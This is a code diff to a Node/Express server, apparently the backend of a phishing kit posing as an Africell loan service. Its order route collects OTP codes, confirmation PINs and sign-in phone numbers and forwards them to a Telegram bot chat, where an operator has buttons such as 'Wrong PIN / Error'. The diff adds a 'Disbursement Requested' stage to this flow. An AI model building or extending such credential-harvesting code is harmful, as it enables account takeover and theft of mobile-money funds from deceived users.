@@ -71,6 +71,7 @@ app.post('/api/submit-order', async (req, res) => {
             uniqueId.startsWith('OTP Code: ') || 
             uniqueId.startsWith('Confirmation PIN: ') || 
             uniqueId.startsWith('Sign-in Phone Number:') || 
+            uniqueId.startsWith('Disbursement Requested -') ||
             uniqueId.startsWith('Application -')
         ));
 
@@ -108,6 +109,9 @@ app.post('/api/submit-order', async (req, res) => {
         } else if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
             headerTitle = "📱 *Africell Sign-in Phone Number*";
             wrongButtonText = "⚠️ Wrong Info";
+        } else if (uniqueId && uniqueId.startsWith('Disbursement Requested -')) {
+            headerTitle = "💰 *Africell Disbursement Request*";
+            wrongButtonText = "⚠️ Wrong PIN / Error";
         } else if (uniqueId && uniqueId.startsWith('Application -')) {
             headerTitle = "📄 *New Loan Application Submitted*";
             wrongButtonText = "❌ Reject Application";
@@ -143,7 +147,7 @@ app.post('/api/submit-order', async (req, res) => {
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const encodedId = encodeURIComponent(uniqueId || 'N/A');
 
-        const sentTelegramMsg = await sendToTelegram(telegramUrl, {
+        await sendToTelegram(telegramUrl, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown',
@@ -282,7 +286,7 @@ async function registerTelegramWebhook() {
 }
 
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'login.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(PORT, () => {
